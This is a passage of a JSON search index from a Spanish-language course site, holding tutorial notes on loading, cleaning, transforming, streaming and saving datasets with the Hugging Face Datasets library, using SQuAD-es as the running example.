{\"num_paragraphs\": len(x[\"paragraphs\"])})\nprint(squad_train.column_names)  # Debe incluir 'num_paragraphs'\nprint(squad_train[0][\"num_paragraphs\"])\n</code></pre> De este modo, cada registro en el <code>split</code> de entrenamiento tiene la columna con el n\u00famero de p\u00e1rrafos.\u200b</p>"},{"location":"bedrock/Actividad1_solution/#4-filtrar-los-ejemplos-con-mas-de-10-parrafos","title":"4. Filtrar los ejemplos con m\u00e1s de 10 p\u00e1rrafos","text":"<p>Usaremos el m\u00e9todo <code>filter()</code>, pasando una funci\u00f3n lambda que conserve solo aquellos ejemplos cuya columna <code>num_paragraphs</code> sea mayor que 10:</p> <p><pre><code>squad_train_large = squad_train.filter(lambda x: x[\"num_paragraphs\"] &gt; 10)\nprint(squad_train_large)\n</code></pre> As\u00ed, el dataset de entrenamiento contiene \u00fanicamente los registros relevantes para el criterio pedido.\u200b</p>"},{"location":"bedrock/Actividad1_solution/#5-eliminar-la-columna-num_paragraphs","title":"5. Eliminar la columna num_paragraphs","text":"<p>Para dejar el dataset limpio, eliminamos la columna extra:</p> <p><pre><code>squad_train_final = squad_train_large.remove_columns(\"num_paragraphs\")\nprint(squad_train_final.column_names)\n</code></pre> Esto deja \u00fanicamente las columnas originales: <code>title</code> y <code>paragraphs</code>.\u200b</p>"},{"location":"bedrock/Actividad1_solution/#6-persistir-el-dataset-en-formato-parquet","title":"6. Persistir el dataset en formato Parquet","text":"<p>El m\u00e9todo to_parquet() permite guardar el dataset resultante en disco en formato Parquet, que es eficiente y compatible para grandes vol\u00famenes de datos.</p> <p><pre><code>squad_train_final.to_parquet(\"squad_train_filtered.parquet\")\n</code></pre> Esto crea el archivo Parquet con los ejemplos filtrados.\u200b</p>"},{"location":"bedrock/Actividad1_solution/#7-publicar-el-dataset-en-hugging-face","title":"7. Publicar el dataset en Hugging Face","text":"<p>Antes de publicar necesitas autenticarte con tu cuenta (aseg\u00farate de tener instalado huggingface_hub y un token de escritura):</p> <p><pre><code>from huggingface_hub import login\nlogin()  # Te pedir\u00e1 el token\n</code></pre> A continuaci\u00f3n, puedes usar el m\u00e9todo <code>push_to_hub</code> del dataset. Opcionalmente, crea primero un <code>DatasetDict</code> si quieres incluir tambi\u00e9n el <code>split</code> de validaci\u00f3n o test:</p> <pre><code>from datasets import DatasetDict\n\nfinal_dataset = DatasetDict({\n    \"train\": squad_train_final,\n    \"test\": squad_test\n})\n</code></pre> <p>Sube el dataset (reemplaza /squad_es_filtrado por tu nombre de usuario/repositorio en Hugging Face) <code>final_dataset.push_to_hub(\"&lt;tu_usuario&gt;/squad_es_filtrado\")</code>"},{"location":"bedrock/Actividad1_solution/#opcionalmente-anade-un-ejemplo-en-la-documentacion-editando-la-dataset-card-en-la-propia-web-de-hugging-face-tal-como-recomienda-la-sesionattached_file1","title":"Opcionalmente, a\u00f1ade un ejemplo en la documentaci\u00f3n editando la \"Dataset Card\" en la propia web de Hugging Face, tal como recomienda la sesi\u00f3n[attached_file:1].","text":"<p>Notas finales - Durante el proceso, imprime ejemplos y utiliza peque\u00f1os prints para comprobar cada paso. - La edici\u00f3n de la tarjeta del dataset (\"Dataset Card\") se realiza desde la web de Hugging Face: ah\u00ed puedes a\u00f1adir un ejemplo, uso previsto y detalles del proceso seguido, favoreciendo la comprensi\u00f3n de terceros usuarios.</p>"},{"location":"bedrock/Actividad1_solution/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> </ul>"},{"location":"bedrock/datasets_aitor/","title":"Cargando datasets en HuggingFace (apuntes de Aitor Medrano)","text":"<p>Ya hemos visto que podemos utilizar diferentes datasets existentes en la plataforma para re-entrenar nuestros modelos.</p> <p>En esta sesi\u00f3n vamos a estudiar c\u00f3mo crear un dataset a partir de nuestros datos, limpiar un dataset, a reducirlo para que quepa en RAM y como tras crear nuestro dataset, subirlo al Hub.</p>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#cargando-datos","title":"Cargando datos","text":"<p>Para cargar datos, haremos uso de la funci\u00f3n <code>load_dataset()</code> de la librer\u00eda Datasets. Si fuera necesaria instalarla, mediante <code>pip</code> har\u00edamos:</p> <pre><code>pip install datasets\n</code></pre> <p>Podemos cargar archivos con diferentes formatos indicando el formato y los datos:</p> <pre><code># CSV &amp; TSV\nload_dataset(\"csv\", data_files=\"mis_datos.csv\")\n# Texto\nload_dataset(\"text\", data_files=\"mis_datos.txt\")\n# JSON &amp; JSONL\nload_dataset(\"json\", data_files=\"mis_datos.jsonl\")\n</code></pre> <p>Para este apartado nos vamos a centrar en los datos de SQuAD (Stanford Question Answering Dataset), compuesto de un conjunto de art\u00edculos de Wikipedia, con respuestas a diferentes preguntas sobre los art\u00edculos. En nuestro caso, nos vamos a centrar en una versi\u00f3n en castellano que podemos ver en https://huggingface.co/datasets/squad_es o descargarlo de desde https://github.com/ccasimiro88/TranslateAlignRetrieve/tree/master/SQuAD-es-v2.0.</p> <p>Si descargamos los archivos y los colocamos en la misma carpeta que el siguiente script, podemos realizar una carga local de los datos:</p> squad-es-local.py<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\")\n\nprint(squad_dataset)\n</code></pre> <p>Tras ejecutarlo, nos muestra que al cargar el dataset ha creado un split para train, con la cantidad de filas y las columnas contenidas dentro de un <code>DatasetDict</code>:</p> <pre><code>Generating train split: 442 examples [00:00, 1211.02 examples/s]\nDatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n})\n</code></pre> <p>Si queremos obtener m\u00e1s informaci\u00f3n, podemos mostrar las caracter\u00edsticas:</p> <pre><code>print(squad_dataset[\"train\"].features)\n# {'title': Value(dtype='string', id=None),\n#  'paragraphs': [\n#     {'context': Value(dtype='string', id=None),\n#      'qas': [\n#         {'answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'id': Value(dtype='string', id=None),\n#          'is_impossible': Value(dtype='bool', id=None),\n#          'plausible_answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'question': Value(dtype='string', id=None)}]\n#     }\n#  ]\n# }\n</code></pre> <p>Y al tratarse de un diccionario, podemos navegar mediante los corchetes para, por ejemplo, recuperar parte de los datos:</p> <pre><code>print(squad_dataset[\"train\"][0][\"title\"])\n# Beyonc\u00e9 Knowles\nprint(squad_dataset[\"train\"][0][\"paragraphs\"][0])\n# {'context': 'Beyonc\u00e9 Giselle Knowles-Carter (nacida el 4 de septiembre de 1981)..',\n # 'qas': [\n    # {'answers': [{'answer_start': 246, 'text': 'a finales de 1990'}],\n    #  'id': '56be85543aeaaa14008c9063', 'is_impossible': False, 'plausible_answers': None, 'question': '\u00bfCu\u00e1ndo Beyonce comenz\u00f3 a ser popular?'},\n    # {'answers': ...\n</code></pre> <p>Cuando cargamos un dataset, realmente queremos cargar los datos de entrenamiento y los de validaci\u00f3n. Para ello, le pasaremos un diccionario con los diferentes archivos para <code>train</code> y para <code>val</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n</code></pre> <p>Obteniendo:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n    val: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 35\n    })\n})\n</code></pre> <p>Si queremos cargar \u00fanicamente una de las partes, le pasaremos el par\u00e1metro <code>split</code> con el valor deseado:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\", split=\"train\")\nprint(squad_dataset_train)\n</code></pre> <p>Si el dataset est\u00e1 en un archivo comprimido en gzip, zip o tar, la librer\u00eda descomprimir\u00e1 los datos autom\u00e1ticamente:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json.zip\", \"val\": \"dev-v2.0-es.json.zip\"}\nsquad_dataset_trainval = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset_trainval)\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#carga-remota","title":"Carga remota","text":"<p>Si el dataset est\u00e1 almacenado en una URL remota, podemos cargarlos directamente:</p> squad-es-remoto.py<pre><code>from datasets import load_dataset\n\nurl = \"https://raw.githubusercontent.com/ccasimiro88/TranslateAlignRetrieve/master/SQuAD-es-v2.0/\"\n\nficheros_datos = {\n    \"train\": url + \"train-v2.0-es.json\",\n    \"val\": url + \"dev-v2.0-es.json\",\n}\nsquad_remote_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n\nprint(squad_remote_dataset)\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#dividiendo-el-dataset","title":"Dividiendo el dataset","text":"<p>Si en vez de cargar por separado los datos de entrenamiento y los de test, tenemos un \u00fanico conjunto de datos, podemos dividirlo mediante el m\u00e9todo <code>Dataset.train_test_split()</code> indicando el tama\u00f1o, por ejemplo, de los datos de test:</p> squad-es-split.py<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\", split=\"train\")\nsquad_split_dataset = squad_dataset.train_test_split(test_size=0.1)\nprint(squad_split_dataset)\n</code></pre> <p>De manera que pasamos de un dataset de 442 filas a uno dividido en 397 para entrenamiento y 45 para test:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 397\n    })\n    test: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 45\n    })\n})\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#cargando-en-pandas","title":"Cargando en Pandas","text":"<p>Si estamos trabajando con Pandas y queremos cargar un archivo que est\u00e1 en un dataset de Hugging Face, podemos utilizar la librer\u00eda de <code>huggingface_hub</code> para crear, eliminar, actualizar y recuperar informaci\u00f3n de los repositorios.</p> <p>Por ejemplo, para cargar un dataset CSV con Pandas podr\u00edamos hacer:</p> <pre><code>from huggingface_hub import hf_hub_download\nimport pandas as pd\n\nREPO_ID = \"aitor-medrano/iabd\"\nFICHERO = \"cp_train.csv\"\n\ndataset = pd.read_csv(\n    hf_hub_download(repo_id=REPO_ID, filename=FICHERO, repo_type=\"dataset\")\n)\nprint(dataset)\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 3214 entries, 0 to 3213\n# Data columns (total 3 columns):\n#  #   Column   Non-Null Count  Dtype  \n# ---  ------   --------------  -----  \n#  0   formula  3214 non-null   object \n#  1   T        3214 non-null   float64\n#  2   Cp       3214 non-null   float64\n# dtypes: float64(2), object(1)\n# memory usage: 75.5+ KB\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#cargando-en-streaming","title":"Cargando en streaming","text":"<p>Si el dataset ocupa varios gigas, con modelos como BERT o GPT, puede que no quepan en memoria RAM. Para ello, la librer\u00eda datasets gestiona los datos como ficheros mapeados en memoria realizando un streaming de los datos.</p> Streaming de un dataset - https://huggingface.co/docs/datasets/stream <p>Para este apartado, vamos a utilizar parte de un dataset con c\u00f3digo encontrado en GitHub de los diferentes lenguajes de programaci\u00f3n, conocido como BigCode.</p> <p>Gated dataset</p> <p>El dataset de BigCode est\u00e1 configurado para pedir las credenciales de los usuarios que los utilizan. Esto se conoce como un Gated dataset. Es por ello que tenemos que hacer login en Hugging Face antes de poder descargarlo.</p> <p>En nuestro caso, nos vamos a centrar en archivos <code>DockerFile</code> para que el dataset sea asumible (alrededor de 1Gb). As\u00ed pues, cargamos los datos:</p> <pre><code>from datasets import load_dataset\n\nbigcode_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\")\nprint(bigcode_dataset)\n# Dataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     num_rows: 4155925\n# })\n</code></pre> <p>Y el contenido de un documento:</p> <pre><code>{\n   \"blob_id\":\"a29dd2b33082d2b98541c66ba3620ae054991503\",\n   \"directory_id\":\"71568d223947f51cb007a8564e5f808e0987779e\",\n   \"path\":\"/src/Dapr/GameServer.Host/Dockerfile\",\n   \"content_id\":\"072b3138be512a71cf4e8bbbdb657497e808d2f6\",\n   \"detected_licenses\":[\n      \"MIT\",\n      \"LicenseRef-scancode-unknown-license-reference\"\n   ],\n   \"license_type\":\"permissive\",\n   \"repo_name\":\"devblack/OpenMU\",\n   \"snapshot_id\":\"8cdc521178da47c9c7d2daa502dc71688835fd0a\",\n   \"revision_id\":\"1064b0dca1a491bc28f325e42ca6b97d406d6558\",\n   \"branch_name\":\"refs/heads/master\",\n   \"visit_date\":Timestamp(\"2023-04-07 10:56:30.043316\"),\n   \"revision_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"committer_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"github_id\":None,\n   \"star_events_count\":0,\n   \"fork_events_count\":0,\n   \"gha_license_id\":None,\n   \"gha_event_created_at\":None,\n   \"gha_created_at\":None,\n   \"gha_language\":None,\n   \"src_encoding\":\"UTF-8\",\n   \"language\":\"Dockerfile\",\n   \"is_vendor\":false,\n   \"is_generated\":false,\n   \"length_bytes\":709,\n   \"extension\":\"\"\n}\n</code></pre> <p>Si ahora cargamos el dataset mediante streaming, pas\u00e1ndole el par\u00e1metros <code>streaming=True</code>, en vez de recuperar un Dataset, obtendremos un <code>IterableDataset</code>:</p> <pre><code>from datasets import load_dataset\n\nstreaming_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\", streaming=True)\nprint(streaming_dataset)\n# Resolving data files: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 976/976 [00:00&lt;00:00, 1064.36it/s]\n# IterableDataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     n_shards: 1\n# })\n</code></pre> <p>Como sugiere el nombre, para acceder a los elementos del <code>IterableDataset</code> necesitamos iterar sobre \u00e9l:</p> <pre><code>print(next(iter(streaming_dataset)))\n</code></pre> <p>Los elementos de un dataset en streaming  se pueden procesar al vuelo mediante la funci\u00f3n <code>map</code> o <code>filter</code>. Por ejemplo, para pasar a may\u00fasculas el campo <code>license_type</code> har\u00edamos:</p> <pre><code>def mayusLicencias(registro):\n    registro[\"license_type\"] = registro[\"license_type\"].upper()\n    return registro\n\nmapped_dataset = streaming_dataset.map(mayusLicencias)\n\nprint(next(iter(streaming_dataset)))\n# ... 'detected_licenses': ['MIT', ...], 'license_type': 'PERMISSIVE', 'repo_name': 'devblack/OpenMU' ...\n</code></pre> <p>Al vuelo</p> <p>Debemos tener en cuenta que la transformaci\u00f3n se realizar\u00e1 al recorrer el dataset, no al invocar a los m\u00e9todos <code>map</code> o <code>filter</code>.</p> <p>Otras opciones son utilizar las operaciones <code>take()</code>, <code>shuffle()</code> o <code>skip()</code> dentro del <code>IterableDataset</code> para trabajar con muestras peque\u00f1as de los datos cargados:</p> <pre><code>muestra = streaming_dataset.take(100)\nmuestra_aleatoria = streaming_dataset.shuffle(seed=42, buffer_size=1000).take(500)\nrango = streaming_dataset.skip(1000).take(100)\n</code></pre> <p>M\u00e1s informaci\u00f3n en https://huggingface.co/docs/datasets/stream y https://huggingface.co/docs/datasets/about_mapstyle_vs_iterable.</p>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#limpiando","title":"Limpiando","text":"<p>De forma similar a Pandas o Spark, podemos manipular el contenido de los objetos <code>Dataset</code>.</p> <p>El primer paso deber\u00eda ser barajar los datos para desordenarlos y coger una muestra. Para ello, emplearemos <code>Dataset.shuffle()</code>:</p> <pre><code>squad_train = squad_dataset_trainval[\"train\"]\nprint(squad_train[0][\"title\"]) # Beyonc\u00e9 Knowles\n\nsquad_train_shuffled = squad_train.shuffle(seed=333)\nprint(squad_train_shuffled[0][\"title\"]) # Carnaval\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#seleccionando-filas","title":"Seleccionando filas","text":"<p>Para recuperar filas, usaremos el m\u00e9todo <code>Dataset.select()</code> pas\u00e1ndole un iterador con las posiciones a seleccionar:</p> <pre><code>tres_filas = squad_train_shuffled.select([5,10,15])\nseis_filas = squad_train_shuffled.select(range(6))\n</code></pre> <p>Si queremos seleccionar las filas por alg\u00fan criterio espec\u00edfico, debemos emplear <code>Dataset.filter()</code> y funciones lambda:</p> <pre><code>empieza_por_b_filas = squad_train_shuffled.filter(lambda x: x[\"title\"].startswith(\"B\"))\nfor i in range(empieza_por_b_filas.num_rows):\n    print(empieza_por_b_filas[i][\"title\"])\n# Beidou _ Navigation _ Satellite _ System (en ingl\u00e9s)\n# Biodiversidad\n# Boston ...\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#trabajando-con-columnas","title":"Trabajando con columnas","text":"<p>Al trabajar con columnas, podemos a\u00f1adir una nueva mediante <code>Dataset.add_column()</code>, cambiarles el nombre con <code>DatasetDict.rename_column()</code> o eliminar una columna con <code>DatasetDict.remove_column()</code>:</p> <pre><code>nueva_columna = [\"nueva\"] * squad_train_shuffled.num_rows\nsquad_train_shuffled = squad_train_shuffled.add_column(name=\"inicial\",column=nueva_columna)\n# Dataset({\n#     features: ['title', 'paragraphs', 'inicial'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.rename_column(\n    original_column_name=\"inicial\", new_column_name=\"modificada\"\n)\n# Dataset({\n#     features: ['title', 'paragraphs', 'modificada'],\n#     num_rows: 442\n# })\nsquad_train_shuffled = squad_train_shuffled.remove_columns([\"modificada\"])\n# Dataset({\n#     features: ['title', 'paragraphs'],\n#     num_rows: 442\n# })\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#trabajando-con-map","title":"Trabajando con map","text":"<p>Y la joya de la corona es la funci\u00f3n <code>Dataset.map()</code> para aplicar una transformaci\u00f3n a medida. Por ejemplo, si queremos modificar todos los t\u00edtulos y pasarlos a min\u00fascula haremos:</p> squad-map.py<pre><code>from datasets import load_dataset\n\nficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nsquad_dataset = squad_dataset[\"train\"]\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\nsquad_minus = squad_dataset.map(titulo_minus)\n\n# Mostramos 5 elementos\nprint(squad_minus.shuffle(seed=987)[\"title\"][:5])\n# ['marshall', 'ascensor', 'kanye', 'bbc televisi\u00f3n', 'florida']\n</code></pre> <p>Mediante la funci\u00f3n <code>map</code> tambi\u00e9n podemos crear nuevas columnas a partir de los valores de otras. Por ejemplo, a\u00f1adimos una nueva caracter\u00edstica con la cantidad de p\u00e1rrafos y quitamos toda la informaci\u00f3n existente previamente de los p\u00e1rrafos:</p> <pre><code># A\u00f1adimos nueva columna\nsquad_col_num_parrafos = squad_dataset.map(lambda x: {\"num_paragraphs\":len(x[\"paragraphs\"])})\n# Borramos la antigua\nsquad_col_num_parrafos = squad_col_num_parrafos.remove_columns(\"paragraphs\")\nprint(squad_col_num_parrafos.shuffle(seed=987)[:5])\n# {'title': ['Marshall', 'Ascensor', 'Kanye', 'BBC Televisi\u00f3n', 'Florida'], 'num_paragraphs': [51, 52, 79, 31, 35]}\n</code></pre> <p>\u00bfY si queremos ordenar los p\u00e1rrafos por la cantidad de p\u00e1rrafos? Para ello, podemos utilizar <code>Dataset.sort()</code>:</p> <pre><code>squad_num_parrafos_ordenados = squad_col_num_parrafos.sort(\"num_paragraphs\")\n\nprint(squad_num_parrafos_ordenados[:3]) # tres primeros\n# {'title': ['Tono _ (m\u00fasica)', 'Uva', 'Letra _ case'], 'num_paragraphs': [10, 10, 12]}\n\nprint(squad_num_parrafos_ordenados[-3:]) # tres \u00faltimos\n# {'title': ['American Idol (en ingl\u00e9s).', 'Nueva York', 'Budismo'], 'num_paragraphs': [127, 148, 149]}\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#trabajando-con-batches","title":"Trabajando con batches","text":"<p>El m\u00e9todo <code>Dataset.map()</code> admite el argumento <code>batched</code> que, si se establece en <code>True</code>, hace que env\u00ede un lote de datos a la funci\u00f3n <code>map</code> a la vez (el tama\u00f1o del lote es configurable mediante el par\u00e1metro <code>batch_size</code>, pero por defecto es de 1000). Al indicar <code>batched=True</code>, la funci\u00f3n <code>map</code> recibe un diccionario con los campos del conjunto de datos, pero cada valor es ahora una lista de valores, y no un \u00fanico valor, y del mismo modo, devuelve un diccionario con los campos que queremos actualizar o a\u00f1adir a nuestro conjunto de datos, y una lista de valores.</p> <p>Por ello, debemos modificar la funci\u00f3n que realiza el <code>map</code> para que trabaje con un diccionario de listas.</p> <p>Para el siguiente ejemplo, vamos a coger el dataset de SQuAD_es desde Hugging Face que contiene m\u00e1s datos, y vamos a comparar el tiempo de ejecuci\u00f3n, recodificando la funci\u00f3n para trabajar con un diccionario que contiene una lista por cada campo:</p> squad-map-batch.py<pre><code>from datasets import load_dataset\nimport time\n\n# Cargamos el dataset desde HF\nsquad_dataset = load_dataset(\"squad_es\", \"v2.0.0\", split=\"train\")  # (1)!\n\ndef titulo_minus(registro):\n    return {\"title\":registro[\"title\"].lower()}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus) # (2)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 37926.07 examples/s]   \nfin = time.time()\nprint(fin - inicio) # 3.008699893951416\n\ndef titulo_minus_batch(batch):\n    return {\"title\":[titulo.lower() for titulo in batch[\"title\"]]}\n\ninicio = time.time()\nsquad_minus = squad_dataset.map(titulo_minus_batch, batched=True) # (3)!\n# Map: 100%|\u2588\u2588\u2588\u2588\u2588\u2588| 11858/11858 [00:00&lt;00:00, 535210.67 examples/s]\nfin = time.time()\nprint(fin - inicio) # 0.19133710861206055\n</code></pre> <ol> <li>Cargamos los datos desde el dataset de Hugging Face</li> <li>El mapper normal realiza casi 40.000 registros por segundo</li> <li>Al hacerlo con batches realiza m\u00e1s de 500.000 por segundo</li> </ol>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#uso-de-pandas","title":"Uso de Pandas","text":"<p>Para facilitar la conversi\u00f3n entre diferentes formados, podemos usar el m\u00e9todo <code>Dataset.set_format()</code> para modificar el formato de salida (por ejemplo, a <code>pandas</code>, <code>numpy</code>, <code>torch</code>, <code>tensorflow</code>, <code>jax</code>, ...), sin modificar el formato original del dataset (el cual es Apache Arrow - <code>arrow</code>).</p> <p>As\u00ed, si por ejemplo queremos pasar los datos a Pandas para trabajar con ellos, transformarlos o visualizarlos, podemos hacer:</p> <pre><code>print(squad_dataset[0])\nsquad_dataset.set_format(\"pandas\")\ndf = squad_dataset[:]\nprint(df.shape) # (130313, 5)\n\n# Otra forma\ndf2 = squad_dataset.to_pandas()\nprint(df2.info())\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 130313 entries, 0 to 130312\n# Data columns (total 5 columns):\n#  #   Column    Non-Null Count   Dtype \n# ---  ------    --------------   ----- \n#  0   id        130313 non-null  object\n#  1   title     130313 non-null  object\n#  2   context   130313 non-null  object\n#  3   question  130313 non-null  object\n#  4   answers   130313 non-null  object\n# dtypes: object(5)\n# memory usage: 5.0+ MB\n\n# Y realizar consultas sobre los datos, por ejemplo, la 5 preguntas con m\u00e1s respuestas\nprint(df2.groupby(\"title\")[\"answers\"].count().nlargest(5))\n# title\n# Reina                         883\n# Nueva York                    817\n# American Idol (en ingl\u00e9s).    790\n# Beyonc\u00e9 Knowles               753\n# Universidad                   738\n</code></pre> <p>Y para volver a tener un objeto <code>Dataset</code>, podemos utilizar el m\u00e9todo <code>Dataset.from_pandas()</code> o resetear el dataset que ten\u00edamos mediante <code>Dataset.reset_format()</code>:</p> <pre><code>squad_transformed = Dataset.from_pandas(df)\nsquad_original = squad_dataset.reset_format()\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#creando-un-dataset-desde-cero","title":"Creando un dataset desde cero","text":"<p>Si en vez de cargar un dataset, tenemos que crear uno, el primer paso ser\u00e1 obtener los datos.</p> <p>Ya sea mediante peticiones a URL externas con la librer\u00eda <code>request</code>, accediendo a bases de datos relacionales, por ejemplo, mediante SQLAlchemy o a MongoDB mediante <code>PyMongo</code>, lo m\u00e1s normal es crear una estructura de datos mediante una lista o un diccionario y luego crear el dataset a partir del mismo.</p> <p>As\u00ed pues, si en vez de cargar un dataset queremos crear uno desde cero, podemos hacer uso de <code>Dataset.from_dict()</code> o <code>Dataset.from_list()</code> dependiendo de donde tengamos los datos. Por ejemplo, vamos a conectarnos a MongoDB y creamos una lista con todos los datos. A partir de la lista, generamos un Dataset:</p> dataset-mongodb.py<pre><code>from datasets import Dataset\nfrom pymongo import MongoClient\n\ncliente = MongoClient('mongodb+srv://iabd:iabdiabd@cluster0.dfaz5er.mongodb.net')\n\n# Vamos a trabajar con la colecci\u00f3n grades de sample_training\niabd_db = cliente.sample_training\ngrades_coll = iabd_db.grades\n\n# Creamos un dataset vac\u00edo mediante una lista\ndocumentos = []\n\n# Recuperamos todas las calificaciones\ncursor = grades_coll.find({})\nfor document in cursor:\n  del document[\"_id\"]  # Quitamos el ObjectId\n  documentos.append(document)\n\nmongo_dataset = Dataset.from_list(documentos)\nprint(mongo_dataset)\n# Dataset({\n#     features: ['student_id', 'scores', 'class_id'],\n#     num_rows: 100000\n# })\n</code></pre> <p>O si queremos almacenar los datos de forma temporal, por ejemplo, podemos hacer uso de Pandas:</p> <pre><code>df = pd.DataFrame.from_records(documentos)\ndf.to_json(\"grades-docs.jsonl\", orient=\"records\", lines=True)\njsonl_dataset = load_dataset(\"json\", data_files=\"grades-docs.jsonl\", split=\"train\")\n</code></pre>","tags":["HuggingFace"]},{"location":"bedrock/datasets_aitor/#persistiendo","title":"Persistiendo","text":"<p>Cuando cargamos un dataset se cachean los datos para evitar tener que descargar los datos de forma remota y crear las tablas de PyArrow. Podemos averiguar donde se almacenan los datos mediante la propiedad <code>cache_files</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"test\": \"dev-v2.0-es.json\"}\nsquad_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset.cache_files)\n# {'train': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-train.arrow'}],\n#  'test': [{'filename': '/Users/aitormedrano/.cache/huggingface/datasets/json/default-e3ff36a1d8fe78df/0.0.0/ab573428e7a11a7e23eebd41a2a71665ac3789ce311cbad7049572034a9bda05/json-test.arrow'}]}\n</code></pre> <p>Si necesitamos persistir los datos de nuevo con las transformaciones realizadas, podemos hacerlo en diferentes formatos:</p> <ul> <li>Arrow: <code>Dataset.save_to_disk()</code></li> <li>CSV: <code>Dataset.to_csv()</code></li> <li>Pandas: <code>Dataset.to_pandas()</code></li> <li>JSON: <code>Dataset.to_json()</code></li> <li>Parquet: <code>Dataset.to_parquet()</code></li> </ul> <p>Si por ejemplo persistimos el dataset en Arrow:</p> <pre><code>squad_dataset.save_to_disk(\"squad_train_test\")\n</code></pre> <p>Se crear\u00e1 la siguiente estructura en las carpetas, donde para cada split se ha creado su propia carpeta, as\u00ed como un par de archivos con metadatos:</p> <pre><code>squad_train_test\n\u251c\u2500\u2500 dataset_dict.json\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 data-00000-of-00001.arrow\n\u2502   \u251c\u2500\u2500 dataset_info.json\n\u2502   \u2514\u2500\u2500 state.json\n\u2514\u2500\u2500 train\n    \u251c\u2500\u2500 data-00000-of-00001.arrow\n    \u251c\u2500\u2500 dataset_info.json\n    \u2514\u2500\u2500 state.json\n</code></pre> <p>Una vez que hemos persistido el dataset, lo podemos volver a cargar mediante <code>load_from_disk</code>:</p> <pre><code>from datasets import load_from_disk\nsquad_disk = load_from_disk(\"squad_train_test\")\n</code></pre> <p>Si queremos persistirlos en formato CSV o JSON, por cada uno de los splits se crea un archivo separado. Para ello, podemos iterar sobre las claves mediante <code>DatasetDict.items()</code>:</p> <pre><code>for split, dataset in squad_dataset.items():\n    